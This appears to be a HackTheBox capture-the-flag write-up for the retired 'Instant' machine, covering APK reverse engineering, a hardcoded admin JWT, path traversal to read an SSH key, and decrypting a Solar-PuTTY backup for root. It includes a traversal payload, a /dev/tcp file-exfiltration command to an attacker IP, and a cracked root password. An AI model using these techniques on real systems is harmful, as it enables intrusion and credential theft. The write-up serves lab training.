# Instant

```
Platform    : HackTheBox
OS          : Linux
Difficulty  : Medium
Category    : API / Path Traversal / Android Reverse Engineering
IP          : 10.129.231.155
```

---

## Summary

The target hosted a fintech-style web app offering an Android APK
download. Reverse engineering that APK revealed two internal
subdomains, one exposing a Swagger-documented API and a hardcoded
admin JWT bearer token inside the app's compiled code. Using that
token to authenticate against an admin-only log-reading endpoint
enabled a path traversal vulnerability, used to read a local user's
SSH private key and gain shell access. Further enumeration uncovered
an encrypted Solar-PuTTY session backup file containing root's
password, cracked offline to escalate to full root access.

---

## Reconnaissance

```
nmap -p- -sS --min-rate 5000 -vvv -Pn 10.129.231.155 -oN scan.txt
nmap -p 22,80 -sCV 10.129.231.155
```

Key findings:

- **Port 22** — OpenSSH 9.6p1 (Ubuntu)
- **Port 80** — Apache 2.4.58, redirecting to `instant.htb`

The site offered an Android APK download, promoted as a
"send funds instantly" fintech app:

![Instant landing page offering the APK download](./images/instant/instant-landing.png)

---

## Enumeration

The APK was decompiled with `jadx-gui`. Following the general rule of
checking `res/xml` for configuration files when reverse engineering an
Android app, `network_security_config.xml` revealed two internal
subdomains not otherwise discoverable:

```
mywalletv1.instant.htb
swagger-ui.instant.htb
```

![network_security_config.xml revealing the two subdomains](./images/instant/apk-subdomains.png)

The `swagger-ui` subdomain hosted a fully documented API, including
admin-only endpoints for listing users and reading application logs:

![Swagger UI listing the Instant API endpoints](./images/instant/swagger-ui.png)

The `/api/v1/admin/read/log` endpoint's documentation itself leaked a
useful detail in its example response — a `FileName` field showing
the expected log path structure, which revealed a system username
(`shirohige`) that hadn't been discovered any other way:

```json
{
  "Content": "Log file contents go here...",
  "FileName": "/home/shirohige/logs/1.log",
  "Status": 200
}
```

![Endpoint documentation leaking the /home/shirohige/logs/ path](./images/instant/endpoint-filename-leak.png)

Testing the endpoint without credentials confirmed it required
authentication:

```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=test"
```

![401 Unauthorized without a valid token](./images/instant/unauthorized-401.png)

Returning to the decompiled APK, its `AdminActivities` class
contained a hardcoded `Authorization` header with a full JWT bearer
token:

![Hardcoded JWT bearer token found in the APK's AdminActivities class](./images/instant/apk-jwt-token.png)

---

## Foothold

The extracted token was set as the Bearer Auth value directly in the
Swagger UI:

![Pasting the extracted token into Swagger's authorization dialog](./images/instant/swagger-authorize.png)

```
Authorized
```

![Swagger UI confirming the session is authorized](./images/instant/swagger-authorized.png)

With a valid admin session, the log-reading endpoint was targeted
directly at the SSH private key path leaked earlier — but a direct
absolute path failed:

```
log_file_name=/home/shirohige/.ssh/id_rsa
```

```
500 Internal Server Error
```

![Absolute path attempt failing with a 500 error](./images/instant/traversal-fail-absolute.png)

This behavior — failing on an absolute path rather than simply
denying it — suggested the endpoint concatenates `log_file_name` onto
a fixed base directory (the `/home/shirohige/logs/` seen earlier)
rather than using it as-is. That base directory could be escaped with
a relative path traversal instead:

```
log_file_name=../../../../home/shirohige/.ssh/id_rsa
```

```
201 (Undocumented)
"/home/shirohige/logs/../../../../home/shirohige/.ssh/id_rsa": [
  "-----BEGIN OPENSSH PRIVATE KEY-----\n",
  ...
]
```

![Successful path traversal, leaking the SSH private key content](./images/instant/traversal-success.png)

The key content (returned as a JSON array of lines) was reassembled
into a proper key file:

```bash
grep -o '".*"' clave_raw.json | tr -d '"\n,' | sed 's/\\n/\n/g' > id_rsa
chmod 600 id_rsa
ssh -i id_rsa shirohige@instant.htb
```

```
shirohige@instant:~$
```

---

## Privilege Escalation

Enumeration under `/opt` revealed a backup directory for
**Solar-PuTTY**, a Windows terminal emulator known for storing saved
session credentials in an encrypted local file:

```
shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat
```

The content was base64-encoded but not directly decryptable without
the tool's specific key-derivation scheme. A known public decryption
script for Solar-PuTTY backups
([xHacka/052e4b09...](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5))
was used to brute-force the encryption key against `rockyou.txt`:

```bash
# transfer the file out
cat < sessions-backup.dat > /dev/tcp/10.10.14.193/443
# attacker
nc -lvnp 443 > session-backup.dat

python3 SolarPuttyDecrypt.py session-backup.dat /usr/share/wordlists/rockyou.txt
```

```
[103] password='estrella'
```

```json
{"Credentials":[{"CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12", ...}]}
```

The recovered root password was used directly:

```
su root
Password:
```

```
root@instant:~# whoami
root
```

---

## Lessons Learned

- Android APKs bundled with a web app are worth decompiling as a
  matter of routine, not just when the web app itself looks like a
  dead end — hardcoded tokens and internal subdomain references are
  extremely common in mobile client code that was never meant to be
  fully public.
- API documentation (Swagger/OpenAPI specs) can leak more than
  endpoints — example response values, like the log file path seen
  here, often reveal real filesystem structure or usernames that
  weren't discoverable through normal enumeration.
- A "path not found" vs. a generic 500 error on an absolute path is a
  meaningful signal: it suggests string concatenation rather than
  simple validation, which is exactly the condition that makes
  relative path traversal (`../`) effective.
- Third-party credential managers (Solar-PuTTY here, but the same
  applies to any password manager or session tool) often store data
  encrypted with a derivable or brute-forceable scheme — worth
  checking for known decryption tools publicly documented for the
  specific product before assuming the data is a dead end.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
